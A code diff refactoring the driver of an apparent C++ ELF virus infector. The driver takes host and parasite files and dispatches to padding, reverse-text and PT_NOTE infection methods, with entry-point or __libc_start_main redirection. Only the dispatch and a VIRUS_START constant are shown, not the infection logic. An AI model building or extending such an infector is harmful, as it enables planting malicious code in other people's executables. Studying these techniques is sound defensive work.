@@ -15,6 +15,9 @@ const char* PT_NOTE_TO_LOAD = "pt_note";
 const char* ENTRY_POINT = "entry_point";
 const char* LIBC_MAIN_START = "libc_main_start";
 
+// This must be adjusted according to the startup code.
+constexpr size_t VIRUS_START = 44;
+
 // Usage %s <host> <parasite> <infection method> <redirection method>
 int main(int argc, char** argv) {
   if (argc != 5) {
@@ -33,12 +36,12 @@ int main(int argc, char** argv) {
     if (redirect == ENTRY_POINT) {
       ret = vf::infector::infect<vf::infector::PaddingInfector,
                                  vf::redirection::EntryPointPatcher, SignerT>(
-          argv[1], argv[2], 44);
+          argv[1], argv[2], VIRUS_START);
     } else if (redirect == LIBC_MAIN_START) {
       ret =
           vf::infector::infect<vf::infector::PaddingInfector,
                                vf::redirection::LibcStartMainPatcher, SignerT>(
-              argv[1], argv[2], 44);
+              argv[1], argv[2], VIRUS_START);
     } else {
       vf::printf("Unsupported redirection: %s\n", redirect.c_str());
     }
@@ -46,12 +49,12 @@ int main(int argc, char** argv) {
     if (redirect == ENTRY_POINT) {
       ret = vf::infector::infect<vf::infector::ReverseTextInfector,
                                  vf::redirection::EntryPointPatcher, SignerT>(
-          argv[1], argv[2], 44);
+          argv[1], argv[2], VIRUS_START);
     } else if (redirect == LIBC_MAIN_START) {
       ret =
           vf::infector::infect<vf::infector::ReverseTextInfector,
                                vf::redirection::LibcStartMainPatcher, SignerT>(
-              argv[1], argv[2], 44);
+              argv[1], argv[2], VIRUS_START);
     } else {
       vf::printf("Unsupported redirection: %s\n", redirect.c_str());
     }
@@ -59,12 +62,12 @@ int main(int argc, char** argv) {
     if (redirect == ENTRY_POINT) {
       ret = vf::infector::infect<vf::infector::PtNoteInfector,
                                  vf::redirection::EntryPointPatcher, SignerT>(
-          argv[1], argv[2], 44);
+          argv[1], argv[2], VIRUS_START);
     } else if (redirect == LIBC_MAIN_START) {
       ret =
           vf::infector::infect<vf::infector::PtNoteInfector,
                                vf::redirection::LibcStartMainPatcher, SignerT>(
-              argv[1], argv[2], 44);
+              argv[1], argv[2], VIRUS_START);
     } else {
       vf::printf("Unsupported redirection: %s\n", redirect.c_str());
     }
